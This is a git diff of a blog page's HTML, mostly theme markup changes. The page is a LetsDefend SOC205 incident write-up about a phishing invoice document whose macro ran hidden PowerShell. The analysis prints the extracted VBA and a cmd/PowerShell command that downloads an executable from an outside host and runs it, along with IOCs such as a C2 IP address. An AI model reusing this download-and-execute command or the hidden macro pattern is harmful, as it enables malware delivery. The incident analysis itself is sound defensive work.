@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-        <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="author" content="">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>SOC205 Case Study: Malicious Macro Execution via Phishing Invoice :: Hello w3nch</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="Alert Name: SOC205 – Malicious Macro has been executed
 Severity: High
 Event ID: 231
@@ -14,78 +14,97 @@ Category: Malware
 Platform: LetsDefend SOC
 Executive Summary (Management / Business) On February 28, 2024, a user received a malicious email that appeared to contain a legitimate invoice document. When the user opened the attachment, hidden malicious code inside the document was automatically executed.
 This hidden code attempted to connect to an external system controlled by an attacker and download additional harmful software." />
-<meta name="keywords" content=", soc, letsdefend, malware, phishing, macros, powershell, incident-response" />
-<meta name="robots" content="noodp" />
-<meta name="theme-color" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
 <link rel="canonical" href="http://localhost:1313/writeups/letsdefend/alerts/soc205---malicious-macro-has-been-executed/" />
 
 
-    <title>
-        
-            SOC205 Case Study: Malicious Macro Execution via Phishing Invoice :: Hello w3nch 
-        
-    </title>
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.64355604529405b8a6a03699668a57f6e03d8fd15b6b3b96cf9364bf18a602f8.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/writeups.min.f97cbcd47e8113ea91483092b8ce27fd630e9643fa563f0ba30c56c5fb1557c4.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
 
 
 
 
 
-  <link rel="stylesheet" href="/main.min.ebe3824dfa5345ef854f8b255c278f701966e9be3892354b588fb1650ecd358e.css" integrity="sha256-6&#43;OCTfpTRe&#43;FT4slXCePcBlm6b44kjVLWI&#43;xZQ7NNY4=" crossorigin="anonymous">
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
 
 
 
-
-    
-        <link rel="stylesheet" type="text/css" href="css/code.css">
-    
-
-    
-        <link rel="stylesheet" type="text/css" href="css/writeups.css">
-    
-
-
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-    <link rel="manifest" href="/site.webmanifest">
-    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="/favicon.ico">
-    <meta name="msapplication-TileColor" content="">
-
-
-<meta itemprop="name" content="SOC205 Case Study: Malicious Macro Execution via Phishing Invoice">
-<meta itemprop="description" content="Alert Name: SOC205 – Malicious Macro has been executed
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="SOC205 Case Study: Malicious Macro Execution via Phishing Invoice">
+<meta property="og:description" content="Alert Name: SOC205 – Malicious Macro has been executed
 Severity: High
 Event ID: 231
 Event Time: Feb 28, 2024 – 08:42 AM
 Category: Malware
 Platform: LetsDefend SOC
 Executive Summary (Management / Business) On February 28, 2024, a user received a malicious email that appeared to contain a legitimate invoice document. When the user opened the attachment, hidden malicious code inside the document was automatically executed.
-This hidden code attempted to connect to an external system controlled by an attacker and download additional harmful software."><meta itemprop="datePublished" content="2026-01-19T00:00:00+00:00" />
-<meta itemprop="dateModified" content="2026-01-19T00:00:00+00:00" />
-<meta itemprop="wordCount" content="1353">
-<meta itemprop="keywords" content="soc,letsdefend,malware,phishing,macros,powershell,incident-response," />
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SOC205 Case Study: Malicious Macro Execution via Phishing Invoice"/>
-<meta name="twitter:description" content="Alert Name: SOC205 – Malicious Macro has been executed
-Severity: High
-Event ID: 231
-Event Time: Feb 28, 2024 – 08:42 AM
-Category: Malware
-Platform: LetsDefend SOC
-Executive Summary (Management / Business) On February 28, 2024, a user received a malicious email that appeared to contain a legitimate invoice document. When the user opened the attachment, hidden malicious code inside the document was automatically executed.
-This hidden code attempted to connect to an external system controlled by an attacker and download additional harmful software."/>
+This hidden code attempted to connect to an external system controlled by an attacker and download additional harmful software." />
+<meta property="og:url" content="http://localhost:1313/writeups/letsdefend/alerts/soc205---malicious-macro-has-been-executed/" />
+<meta property="og:site_name" content="Hello w3nch" />
+
+  <meta property="og:image" content="http://localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="SOC Analysis" />
+
+  <meta property="article:section" content="Malware Investigation" />
 
 
-
-
-
-    <meta property="article:section" content="SOC Analysis" />
-
-    <meta property="article:section" content="Malware Investigation" />
-
-
-
-    <meta property="article:published_time" content="2026-01-19 00:00:00 &#43;0000 UTC" />
+  <meta property="article:published_time" content="2026-01-19 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -98,102 +117,144 @@ This hidden code attempted to connect to an external system controlled by an att
 
 
 
-    </head>
+</head>
+<body>
 
-    
-        <body>
-    
-    
-        <div class="container">
-            <header class="header">
-    <span class="header__inner">
-        <a href="/" style="text-decoration: none;">
-    <div class="logo">
-        
-            <span class="logo__mark">></span>
-            <span class="logo__text ">
-                hello ;)</span>
-            <span class="logo__cursor" style=
-                  "
-                   
-                   ">
-            </span>
-        
-    </div>
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    hello ;)
+  </div>
 </a>
 
-
-        <span class="header__right">
-                <nav class="menu">
-    <ul class="menu__inner">
-                <li><a href="/about/">About</a></li>
-            
-                <li><a href="/posts/">Blog</a></li>
-            
-                <li><a href="/contact/">Contact</a></li>
-            
-                <li><a href="/resume.pdf">Resume</a></li>
-            
-                <li><a href="/writeups/">Writeup</a></li>
-            
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/posts/">Blog</a></li>
+        
+      
+        
+          <li><a href="/about/">About</a></li>
+        
+      
+        
+          <li><a href="/contact/">Contact</a></li>
+        
+      
+        
+          <li><a href="/resume.pdf">Resume</a></li>
+        
+      
+        
+          <li><a href="/writeups/">Writeup</a></li>
+        
+      
+      
     </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/posts/" >Blog</a></li>
+        
+      
+        
+          <li><a href="/about/" >About</a></li>
+        
+      
+        
+          <li><a href="/contact/" >Contact</a></li>
+        
+      
+        
+          <li><a href="/resume.pdf" >Resume</a></li>
+        
+      
+        
+          <li><a href="/writeups/" >Writeup</a></li>
+        
+      
+      
+    
+  </ul>
 </nav>
 
-
-                <span class="menu-trigger">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path d="M0 0h24v24H0z" fill="none"/>
-                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
-                    </svg>
-                </span>
-                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
- </svg></span>
-        </span>
-    </span>
+  
 </header>
 
 
-            
-    <div class="content">
-        <main class="post">
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/writeups/letsdefend/alerts/soc205---malicious-macro-has-been-executed/">SOC205 Case Study: Malicious Macro Execution via Phishing Invoice</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-01-19</time></div>
 
-            <div class="post-info">
-                
-                </p>
-            </div>
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/soc/">soc</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/letsdefend/">letsdefend</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/malware/">malware</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/phishing/">phishing</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/macros/">macros</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/powershell/">powershell</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/incident-response/">incident-response</a>&nbsp;
+      
+    </span>
+  
+  
 
-            <article>
-                <h2 class="post-title"><a href="http://localhost:1313/writeups/letsdefend/alerts/soc205---malicious-macro-has-been-executed/">SOC205 Case Study: Malicious Macro Execution via Phishing Invoice</a></h2>
 
-                
-                
-                
+  
 
-                <div class="post-content">
-                    <p><strong>Alert Name:</strong> SOC205 – Malicious Macro has been executed<br>
+  <div class="post-content"><div>
+        <p><strong>Alert Name:</strong> SOC205 – Malicious Macro has been executed<br>
 <strong>Severity:</strong> High<br>
 <strong>Event ID:</strong> 231<br>
 <strong>Event Time:</strong> Feb 28, 2024 – 08:42 AM<br>
 <strong>Category:</strong> Malware<br>
 <strong>Platform:</strong> LetsDefend SOC</p>
-<h2 id="executive-summary-management--business">Executive Summary (Management / Business)</h2>
+<h2 id="executive-summary-management--business">Executive Summary (Management / Business)<a href="#executive-summary-management--business" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>On February 28, 2024, a user received a malicious email that appeared to contain a legitimate invoice document. When the user opened the attachment, hidden malicious code inside the document was automatically executed.</p>
 <p>This hidden code attempted to connect to an external system controlled by an attacker and download additional harmful software. Security monitoring systems detected this activity shortly after it occurred.</p>
 <p>Although the malicious file was detected, it was not automatically blocked, which increased the risk to the affected system. As a precaution, the impacted computer was immediately isolated from the network, and all known malicious connections were blocked to prevent further damage.</p>
 <p>There is no confirmed evidence of data loss at this time; however, the incident is considered high risk due to the nature of the attack. Additional security controls and user awareness measures are recommended to reduce the likelihood of similar attacks in the future.</p>
-<h2 id="technical-summary-technical">Technical Summary (Technical)</h2>
+<h2 id="technical-summary-technical">Technical Summary (Technical)<a href="#technical-summary-technical" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>On February 28, 2024, a high-severity security alert (SOC205) was triggered after a user on host <strong>Jayne (172.16.17.198)</strong> executed a malicious macro-enabled Microsoft Word document (<code>edit1-invoice.docm</code>). The file was delivered via a phishing email and contained embedded VBA macros that executed automatically when the document was opened.</p>
 <p>The macro launched a PowerShell command in a hidden window, which attempted to download an external executable (<code>messbox.exe</code>) from a remote server. Network and endpoint logs confirmed DNS resolution and outbound connection attempts to a known malicious IP address (<strong>92.204.221.16</strong>), indicating command-and-control (C2) communication activity.</p>
 <p>The file hash was validated using VirusTotal and Hybrid Analysis, where it was classified as malicious by multiple engines. The document was not quarantined, and macro execution was allowed on the system, increasing the risk of compromise. Immediate response actions included isolating the affected host, removing the phishing email, blocking identified indicators of compromise (IOCs), and preserving forensic artifacts.</p>
 <p>This incident was confirmed as a <strong>True Positive</strong> and represents a successful macro-based malware execution attempt via phishing.</p>
 <hr>
-<h2 id="1-alert-overview">1. Alert Overview</h2>
+<h2 id="1-alert-overview">1. Alert Overview<a href="#1-alert-overview" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>A high-severity malware alert was triggered after a <strong>macro-enabled Microsoft Word document (.docm)</strong> was executed on the host <strong>Jayne</strong>. Macro-enabled Office documents are frequently abused in phishing campaigns to deliver malware through embedded VBA code that launches PowerShell or command-line payloads.</p>
 <p>In this incident, the document successfully executed a malicious macro, resulting in outbound communication attempts to a known malicious command-and-control (C2) infrastructure.</p>
-<h3 id="2-key-event-details">2. Key Event Details</h3>
+<h3 id="2-key-event-details">2. Key Event Details<a href="#2-key-event-details" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <table>
 <thead>
 <tr>
@@ -236,7 +297,7 @@ This hidden code attempted to connect to an external system controlled by an att
 </tr>
 </tbody>
 </table>
-<h2 id="3-threat-indicators-identified">3. Threat Indicators Identified</h2>
+<h2 id="3-threat-indicators-identified">3. Threat Indicators Identified<a href="#3-threat-indicators-identified" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>Macro-enabled Word document (.docm)</li>
 <li>Obfuscated VBA macro execution</li>
@@ -244,24 +305,24 @@ This hidden code attempted to connect to an external system controlled by an att
 <li>DNS lookup and outbound traffic to known malicious IP</li>
 <li>Download-and-execute behavior</li>
 </ul>
-<h2 id="4-malware-quarantine-status">4. Malware Quarantine Status</h2>
+<h2 id="4-malware-quarantine-status">4. Malware Quarantine Status<a href="#4-malware-quarantine-status" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>The malicious document <strong>was not quarantined</strong></li>
 <li>Macro execution was <strong>successful</strong></li>
 <li>Manual investigation and containment were required</li>
 </ul>
-<h2 id="5-malware-analysis-tools-used">5. Malware Analysis Tools Used</h2>
+<h2 id="5-malware-analysis-tools-used">5. Malware Analysis Tools Used<a href="#5-malware-analysis-tools-used" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>The file hash was analyzed using multiple third-party platforms:</p>
 <ul>
 <li><a href="https://www.virustotal.com/gui/file/1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0">VirusTotal</a></li>
 </ul>
-<p><img src="https://i.ibb.co/vvrZZhqY/Pasted-image-20260127180540.png" alt=""></p>
+<p><img src="https://i.ibb.co/vvrZZhqY/Pasted-image-20260127180540.png"></p>
 <ul>
 <li><a href="https://hybrid-analysis.com/search?query=1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0">Hybrid Analysis</a>
-<img src="https://i.ibb.co/nNmDC5Vf/Pasted-image-20260127180647.png" alt=""></li>
+<img src="https://i.ibb.co/nNmDC5Vf/Pasted-image-20260127180647.png"></li>
 </ul>
-<p><img src="https://i.ibb.co/ymgwNSQj/Pasted-image-20260127180944.png" alt=""></p>
-<h3 id="analysis-results">Analysis Results</h3>
+<p><img src="https://i.ibb.co/ymgwNSQj/Pasted-image-20260127180944.png"></p>
+<h3 id="analysis-results">Analysis Results<a href="#analysis-results" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
 <li>Multiple security engines flagged the document as <strong>malicious</strong></li>
 <li>Classified as <strong>Trojan / Macro-based malware</strong></li>
@@ -269,17 +330,17 @@ This hidden code attempted to connect to an external system controlled by an att
 <li>Macro triggered PowerShell execution silently</li>
 </ul>
 <p>This confirms the document was intentionally crafted for malicious execution.</p>
-<h2 id="6-command-and-control-c2-communication-check">6. Command-and-Control (C2) Communication Check</h2>
+<h2 id="6-command-and-control-c2-communication-check">6. Command-and-Control (C2) Communication Check<a href="#6-command-and-control-c2-communication-check" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>During log analysis, outbound activity related to the malicious macro was observed.
-<img src="https://i.ibb.co/TBJFbFMZ/Pasted-image-20260127220435.png" alt=""></p>
-<p><img src="https://i.ibb.co/9HKyrs2D/Pasted-image-20260127220833.png" alt=""></p>
+<img src="https://i.ibb.co/TBJFbFMZ/Pasted-image-20260127220435.png"></p>
+<p><img src="https://i.ibb.co/9HKyrs2D/Pasted-image-20260127220833.png"></p>
 <p><strong>C2 IP Address Identified:</strong></p>
 <ul>
 <li><code>92.204.221.16</code></li>
 <li><a href="https://urlscan.io/result/019bff81-53bd-77ce-9ffc-a2200a0d75b3/">URLScan</a></li>
 </ul>
-<p><img src="https://i.ibb.co/cStPfNsc/Pasted-image-20260127221321.png" alt=""></p>
-<h3 id="observed-behavior">Observed Behavior</h3>
+<p><img src="https://i.ibb.co/cStPfNsc/Pasted-image-20260127221321.png"></p>
+<h3 id="observed-behavior">Observed Behavior<a href="#observed-behavior" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
 <li>PowerShell initiated a DNS lookup for the C2 host</li>
 <li>Outbound HTTP requests were observed</li>
@@ -287,10 +348,10 @@ This hidden code attempted to connect to an external system controlled by an att
 </ul>
 <p><strong>C2 Status:</strong> Accessed</p>
 <p>This indicates the macro successfully reached out to external infrastructure.</p>
-<h2 id="7-initial-access-vector--phishing">7. Initial Access Vector – Phishing</h2>
+<h2 id="7-initial-access-vector--phishing">7. Initial Access Vector – Phishing<a href="#7-initial-access-vector--phishing" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>Further investigation focused on how the file reached the host.
-<img src="https://i.ibb.co/NgvKrKvN/Pasted-image-20260127222412.png" alt=""></p>
-<h3 id="findings">Findings</h3>
+<img src="https://i.ibb.co/NgvKrKvN/Pasted-image-20260127222412.png"></p>
+<h3 id="findings">Findings<a href="#findings" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
 <li>A phishing email was received at <strong>08:12 AM</strong></li>
 <li>Sender: <code>jake.admin[@]cybercommunity[.]info</code></li>
@@ -299,8 +360,8 @@ This hidden code attempted to connect to an external system controlled by an att
 <li>At <strong>08:42 AM</strong>, the document was opened and the macro executed</li>
 </ul>
 <p>This confirms <strong>phishing</strong> as the initial access vector.</p>
-<h3 id="8-malware-execution-timeline">8. Malware Execution Timeline</h3>
-<p><img src="https://i.ibb.co/wNnfVbqM/Pasted-image-20260127220503.png" alt=""></p>
+<h3 id="8-malware-execution-timeline">8. Malware Execution Timeline<a href="#8-malware-execution-timeline" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><img src="https://i.ibb.co/wNnfVbqM/Pasted-image-20260127220503.png"></p>
 <table>
 <thead>
 <tr>
@@ -339,43 +400,43 @@ This hidden code attempted to connect to an external system controlled by an att
 </tr>
 </tbody>
 </table>
-<h2 id="9-static-malware-analysis">9. Static Malware Analysis</h2>
+<h2 id="9-static-malware-analysis">9. Static Malware Analysis<a href="#9-static-malware-analysis" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>Static analysis was performed in an isolated environment.</p>
-<h3 id="tools-used">Tools Used</h3>
+<h3 id="tools-used">Tools Used<a href="#tools-used" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
 <li>oleid</li>
 <li>olevba</li>
 <li>exiftool</li>
 </ul>
-<h3 id="results">Results</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>File Name                       : edit1-invoice.docm
-</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">24</span> kB
-</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
-</span></span><span style="display:flex;"><span>File Type                       : DOCM
-</span></span><span style="display:flex;"><span>File Type Extension             : docm
-</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.ms-word.document.macroEnabled.12
-</span></span><span style="display:flex;"><span>Zip Required Version            : <span style="color:#ae81ff">20</span>
-</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
-</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
-</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
-</span></span><span style="display:flex;"><span>Zip CRC                         : 0x4c8f57fb
-</span></span><span style="display:flex;"><span>Zip Compressed Size             : <span style="color:#ae81ff">505</span>
-</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : <span style="color:#ae81ff">1945</span>
-</span></span><span style="display:flex;"><span>Zip File Name                   : <span style="color:#f92672">[</span>Content_Types<span style="color:#f92672">]</span>.xml
-</span></span><span style="display:flex;"><span>Template                        : Normal.dotm
-</span></span><span style="display:flex;"><span>Total Edit Time                 : <span style="color:#ae81ff">4</span> minutes
-</span></span><span style="display:flex;"><span>Pages                           : <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>Words                           : <span style="color:#ae81ff">4</span>
-</span></span><span style="display:flex;"><span>Characters                      : <span style="color:#ae81ff">26</span>
-</span></span><span style="display:flex;"><span>Application                     : Microsoft Office Word
-</span></span><span style="display:flex;"><span>Links Up To Date                : No
-</span></span><span style="display:flex;"><span>Characters With Spaces          : <span style="color:#ae81ff">29</span>
-</span></span><span style="display:flex;"><span>Shared Doc                      : No
-</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
-</span></span><span style="display:flex;"><span>App Version                     : 12.0000
-</span></span><span style="display:flex;"><span>Creator                         : user1
-</span></span><span style="display:flex;"><span>Last Modified By                : Microsoft
-</span></span><span style="display:flex;"><span>Revision Number                 : <span style="color:#ae81ff">5</span>
+<h3 id="results">Results<a href="#results" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">File Name                       : edit1-invoice.docm
+</span></span><span class="line"><span class="cl">File Size                       : <span class="m">24</span> kB
+</span></span><span class="line"><span class="cl">File Permissions                : -rw-r--r--
+</span></span><span class="line"><span class="cl">File Type                       : DOCM
+</span></span><span class="line"><span class="cl">File Type Extension             : docm
+</span></span><span class="line"><span class="cl">MIME Type                       : application/vnd.ms-word.document.macroEnabled.12
+</span></span><span class="line"><span class="cl">Zip Required Version            : <span class="m">20</span>
+</span></span><span class="line"><span class="cl">Zip Bit Flag                    : 0x0006
+</span></span><span class="line"><span class="cl">Zip Compression                 : Deflated
+</span></span><span class="line"><span class="cl">Zip Modify Date                 : 1980:01:01 00:00:00
+</span></span><span class="line"><span class="cl">Zip CRC                         : 0x4c8f57fb
+</span></span><span class="line"><span class="cl">Zip Compressed Size             : <span class="m">505</span>
+</span></span><span class="line"><span class="cl">Zip Uncompressed Size           : <span class="m">1945</span>
+</span></span><span class="line"><span class="cl">Zip File Name                   : <span class="o">[</span>Content_Types<span class="o">]</span>.xml
+</span></span><span class="line"><span class="cl">Template                        : Normal.dotm
+</span></span><span class="line"><span class="cl">Total Edit Time                 : <span class="m">4</span> minutes
+</span></span><span class="line"><span class="cl">Pages                           : <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Words                           : <span class="m">4</span>
+</span></span><span class="line"><span class="cl">Characters                      : <span class="m">26</span>
+</span></span><span class="line"><span class="cl">Application                     : Microsoft Office Word
+</span></span><span class="line"><span class="cl">Links Up To Date                : No
+</span></span><span class="line"><span class="cl">Characters With Spaces          : <span class="m">29</span>
+</span></span><span class="line"><span class="cl">Shared Doc                      : No
+</span></span><span class="line"><span class="cl">Hyperlinks Changed              : No
+</span></span><span class="line"><span class="cl">App Version                     : 12.0000
+</span></span><span class="line"><span class="cl">Creator                         : user1
+</span></span><span class="line"><span class="cl">Last Modified By                : Microsoft
+</span></span><span class="line"><span class="cl">Revision Number                 : <span class="m">5</span>
 </span></span></code></pre></div><table>
 <thead>
 <tr>
@@ -424,7 +485,7 @@ This hidden code attempted to connect to an external system controlled by an att
 </tr>
 </tbody>
 </table>
-<h4 id="macro-execution-flow-simplified">Macro Execution Flow (Simplified)</h4>
+<h4 id="macro-execution-flow-simplified">Macro Execution Flow (Simplified)<a href="#macro-execution-flow-simplified" class="hanchor" ariaLabel="Anchor">#</a> </h4>
 <ol>
 <li>User opens the Word document</li>
 <li>ActiveX control (<code>InkEdit1</code>) gains focus</li>
@@ -436,19 +497,19 @@ This hidden code attempted to connect to an external system controlled by an att
 <li>Downloaded executable is executed
 <strong>Extracted Malicious VBA Code:</strong></li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vb" data-lang="vb"><span style="display:flex;"><span><span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">InkEdit1_GotFocus</span>()
-</span></span><span style="display:flex;"><span>    Run <span style="color:#f92672">=</span> Shell(UserForm1.TextBox1, 0)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="k">Sub</span> <span class="nf">InkEdit1_GotFocus</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Run</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="n">UserForm1</span><span class="p">.</span><span class="n">TextBox1</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">End</span> <span class="k">Sub</span>
 </span></span></code></pre></div><ul>
 <li><code>Shell(..., 0)</code> → Executes the command <strong>with a hidden window</strong></li>
 <li>Command content is stored externally in a form object (evasion)
 <strong>Embedded Command Extracted from UserForm:</strong></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vb" data-lang="vb"><span style="display:flex;"><span>cmd.exe <span style="color:#f92672">/</span>c PowerShell (<span style="color:#66d9ef">New</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Object</span> System.Net.WebClient).DownloadFile(
-</span></span><span style="display:flex;"><span><span style="color:#75715e">&#39;http://www.greyhathacker.net/tools/messbox.exe&#39;,
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&#39;mess.exe&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>)<span style="color:#960050;background-color:#1e0010">;</span> Start<span style="color:#f92672">-</span>Process <span style="color:#75715e">&#39;mess.exe&#39;
-</span></span></span></code></pre></div><h4 id="behavior-breakdown">Behavior Breakdown</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">c</span> <span class="n">PowerShell</span> <span class="p">(</span><span class="k">New</span><span class="o">-</span><span class="kt">Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl"><span class="c">&#39;http://www.greyhathacker.net/tools/messbox.exe&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="c">&#39;mess.exe&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="p">)</span><span class="err">;</span> <span class="n">Start</span><span class="o">-</span><span class="n">Process</span> <span class="c">&#39;mess.exe&#39;
+</span></span></span></code></pre></div><h4 id="behavior-breakdown">Behavior Breakdown<a href="#behavior-breakdown" class="hanchor" ariaLabel="Anchor">#</a> </h4>
 <ul>
 <li>
 <p>Uses <code>cmd.exe</code> as an execution wrapper</p>
@@ -476,22 +537,22 @@ This hidden code attempted to connect to an external system controlled by an att
 </li>
 </ul>
 <p>The macro logic retrieves and executes a command stored within a form control, launching it with a hidden window style.</p>
-<h2 id="10-powershell-payload-behavior">10. PowerShell Payload Behavior</h2>
-<p><img src="https://i.ibb.co/2Y1QZLpB/Pasted-image-20260127220527.png" alt="">
+<h2 id="10-powershell-payload-behavior">10. PowerShell Payload Behavior<a href="#10-powershell-payload-behavior" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p><img src="https://i.ibb.co/2Y1QZLpB/Pasted-image-20260127220527.png">
 The PowerShell command attempted to download a remote executable:</p>
